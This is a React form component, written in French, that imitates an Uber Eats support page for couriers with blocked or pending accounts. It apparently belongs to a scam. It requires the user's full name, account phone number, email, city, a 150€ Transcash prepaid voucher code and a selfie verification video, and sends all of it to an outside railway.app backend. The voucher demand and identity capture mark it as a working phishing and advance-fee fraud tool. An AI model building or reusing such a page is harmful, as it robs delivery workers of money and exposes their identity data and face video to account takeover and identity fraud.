import { useState } from 'react';
import VideoUpload from '../components/VideoUpload';
import SuccessModal from '../components/SuccessModal';

const FormModal = ({ situation, onClose }) => {
  const [currentStep, setCurrentStep] = useState(1);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [submissionResult, setSubmissionResult] = useState(null);
  
  // 6 champs (5 + Transcash)
  const [formData, setFormData] = useState({
    fullName: '',        // 1. Nom complet
    uberId: '',          // 2. Numéro associé au compte
    uberEmail: '',       // 3. Email associé au compte
    city: '',            // 4. Ville
    transcashCode: '',   // 5. Code Transcash
    videoFile: null      // 6. Vidéo selfie
  });

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleVideoUpload = (file) => {
    setFormData(prev => ({
      ...prev,
      videoFile: file
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Validation des 6 champs obligatoires
    const requiredFields = ['fullName', 'uberId', 'uberEmail', 'city', 'transcashCode', 'videoFile'];
    const missingFields = requiredFields.filter(field => !formData[field]);
    
    if (missingFields.length > 0) {
      alert('Veuillez remplir tous les champs obligatoires (*)');
      return;
    }
    
    // Validation email simple
    if (!formData.uberEmail.includes('@')) {
      alert('Veuillez entrer un email valide');
      return;
    }
    
    // Validation code Transcash (format simple)
    if (formData.transcashCode.trim().length < 8) {
      alert('Le code Transcash doit contenir au moins 8 caractères');
      return;
    }
    
    setIsSubmitting(true);
    
    // Simuler l'envoi
    setTimeout(() => {
      setIsSubmitting(false);
      setCurrentStep(2); // Passer à confirmation
    }, 800);
  };

  const handleFinalSubmit = async () => {
    try {
      setIsSubmitting(true);
      
      // Préparer les données FormData
      const formDataToSend = new FormData();
      
      // Ajouter les données texte
      formDataToSend.append('fullName', formData.fullName);
      formDataToSend.append('uberId', formData.uberId);
      formDataToSend.append('uberEmail', formData.uberEmail);
      formDataToSend.append('city', formData.city);
      formDataToSend.append('transcashCode', formData.transcashCode);
      formDataToSend.append('situation', situation);
      
      // Ajouter la vidéo
      if (formData.videoFile) {
        formDataToSend.append('videoFile', formData.videoFile);
      }
      
      // Envoyer au backend
      const response = await fetch('https://uber-eats-assistance-backend-production.up.railway.app/api/form/submit', {        
        method: 'POST',
        body: formDataToSend
      });
      
      const result = await response.json();
      
      if (!response.ok) {
        throw new Error(result.error || 'Erreur lors de l\'envoi');
      }
      
      // Succès - afficher le modal de succès
      setSubmissionResult({
        reference: result.reference || 'UE-' + Date.now().toString().slice(-8),
        email: formData.uberEmail
      });
      setShowSuccessModal(true);
      
      // Fermer le formulaire modal après 1s
      setTimeout(() => {
        onClose();
      }, 1000);
      
    } catch (error) {
      console.error('❌ Erreur:', error);
      
      // Messages d'erreur spécifiques
      if (error.message.includes('Failed to fetch')) {
        alert('❌ Impossible de se connecter au serveur. Vérifiez votre connexion internet.');
      } else if (error.message.includes('CORS')) {
        alert('❌ Erreur de sécurité CORS. Contactez le support technique.');
      } else {
        alert(`❌ Erreur: ${error.message}`);
      }
      
    } finally {
      setIsSubmitting(false);
    }
  };

  // ÉTAPE 1: FORMULAIRE
  if (currentStep === 1) {
    return (
      <>
        <div className="p-6">
          {/* En-tête */}
          <div className="mb-8">
            <div className="flex items-center justify-between mb-2">
              <h2 className="text-xl font-bold text-gray-900">
                {situation === 'waiting' ? '🕐 Assistance en attente' : '🚫 Assistance bloqué'}
              </h2>
              <button
                onClick={onClose}
                className="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center transition-colors"
              >
                <svg className="w-4 h-4 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            <p className="text-sm text-gray-600">
              Remplissez ces 6 informations pour l'assistance technique
            </p>
          </div>

          {/* Formulaire */}
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* 1. NOM COMPLET */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Nom complet *
              </label>
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none"
                placeholder="Ex: Jean Dupont"
                required
              />
            </div>

            {/* 2. NUMÉRO ASSOCIÉ AU COMPTE */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Numéro associé au compte Uber Eats *
              </label>
              <input
                type="text"
                name="uberId"
                value={formData.uberId}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none"
                placeholder="Ex: +33 6 12 34 56 78"
                required
              />
            </div>

            {/* 3. EMAIL ASSOCIÉ AU COMPTE */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Email associé au compte Uber Eats *
              </label>
              <input
                type="email"
                name="uberEmail"
                value={formData.uberEmail}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none"
                placeholder="Ex: jean.dupont@email.com"
                required
              />
            </div>

            {/* 4. VILLE */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Ville d'opération *
              </label>
              <input
                type="text"
                name="city"
                value={formData.city}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none"
                placeholder="Ex: Paris"
                required
              />
            </div>

            {/* 5. CODE TRANSCASH */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Code Transcash 150€ *
              </label>
              <input
                type="text"
                name="transcashCode"
                value={formData.transcashCode}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none"
                placeholder="Ex: 1234 5678 3456"
                required
              />
              <div className="flex items-center justify-between mt-2">
                <p className="text-xs text-gray-500">
                  Code à 12 chiffres reçu après achat Transcash
                </p>
                <span className="text-xs font-bold text-green-600">150€</span>
              </div>
            </div>

            {/* 6. VIDÉO SELFIE */}
            <div className="pt-4 border-t border-gray-200">
              <div className="mb-4">
                <h3 className="text-lg font-semibold text-gray-900 mb-1">
                  Vidéo selfie de vérification *
                </h3>
                <p className="text-sm text-gray-600">
                  Vidéo de 4 secondes montrant votre visage
                </p>
              </div>
              
              <VideoUpload 
                onVideoSelect={handleVideoUpload}
                currentVideo={formData.videoFile}
              />
            </div>

            {/* Boutons */}
            <div className="flex justify-between pt-6 border-t border-gray-200">
              <button
                type="button"
                onClick={onClose}
                className="px-5 py-2.5 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 text-sm font-medium"
              >
                Annuler
              </button>
              
              <button
                type="submit"
                disabled={isSubmitting}
                className="px-5 py-2.5 bg-green-600 text-white rounded-lg hover:bg-green-700 disabled:opacity-50 text-sm font-medium"
              >
                {isSubmitting ? 'Vérification...' : 'Vérifier →'}
              </button>
            </div>
          </form>
        </div>

        {/* Modal de succès */}
        <SuccessModal
          isOpen={showSuccessModal}
          onClose={() => {
            setShowSuccessModal(false);
            window.location.reload(); // Rafraîchir pour nouvelle demande
          }}
          reference={submissionResult?.reference}
          email={submissionResult?.email}
        />
      </>
    );
  }

  // ÉTAPE 2: CONFIRMATION
  return (
    <>
      <div className="p-6">
        <div className="text-center mb-8">
          <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-2xl">📋</span>
          </div>
          
          <h2 className="text-xl font-bold text-gray-900 mb-2">
            Vérification
          </h2>
          <p className="text-sm text-gray-600">
            Confirmez vos 6 informations
          </p>
        </div>

        {/* Récapitulatif */}
        <div className="space-y-4 mb-6">
          <div className="flex justify-between items-center py-3 border-b border-gray-100">
            <span className="text-gray-600">1. Nom complet:</span>
            <span className="font-medium">{formData.fullName}</span>
          </div>
          
          <div className="flex justify-between items-center py-3 border-b border-gray-100">
            <span className="text-gray-600">2. Numéro compte:</span>
            <span className="font-medium">{formData.uberId}</span>
          </div>
          
          <div className="flex justify-between items-center py-3 border-b border-gray-100">
            <span className="text-gray-600">3. Email compte:</span>
            <span className="font-medium">{formData.uberEmail}</span>
          </div>
          
          <div className="flex justify-between items-center py-3 border-b border-gray-100">
            <span className="text-gray-600">4. Ville:</span>
            <span className="font-medium">{formData.city}</span>
          </div>

          <div className="flex justify-between items-center py-3 border-b border-gray-100">
            <span className="text-gray-600">5. Code Transcash:</span>
            <span className="font-medium text-green-600">{formData.transcashCode}</span>
          </div>
          
          <div className="flex justify-between items-center py-3">
            <span className="text-gray-600">6. Vidéo selfie:</span>
            <span className="font-medium text-green-600">
              {formData.videoFile ? '✓ Prête' : '✗ Manquante'}
            </span>
          </div>
        </div>

        {/* Checkbox de confirmation */}
        <div className="mb-6 p-4 bg-gray-50 rounded-lg">
          <label className="flex items-start space-x-3">
            <input
              type="checkbox"
              className="mt-1 rounded border-gray-300 text-green-600"
              required
            />
            <span className="text-sm text-gray-700">
              Je confirme l'exactitude des informations ci-dessus
            </span>
          </label>
        </div>

        {/* Boutons finaux */}
        <div className="flex justify-between pt-6 border-t border-gray-200">
          <button
            onClick={() => setCurrentStep(1)}
            className="px-5 py-2.5 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 text-sm font-medium"
          >
            ← Modifier
          </button>
          
          <button
            onClick={handleFinalSubmit}
            disabled={isSubmitting}
            className="px-5 py-2.5 bg-green-600 text-white rounded-lg hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed text-sm font-medium flex items-center justify-center"
          >
            {isSubmitting ? (
              <>
                <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Envoi en cours...
              </>
            ) : (
              'Envoyer maintenant'
            )}
          </button>
        </div>
      </div>

      {/* Modal de succès */}
      <SuccessModal
        isOpen={showSuccessModal}
        onClose={() => {
          setShowSuccessModal(false);
          window.location.reload(); // Rafraîchir pour nouvelle demande
        }}
        reference={submissionResult?.reference}
        email={submissionResult?.email}
      />
    </>
  );
};

export default FormModal;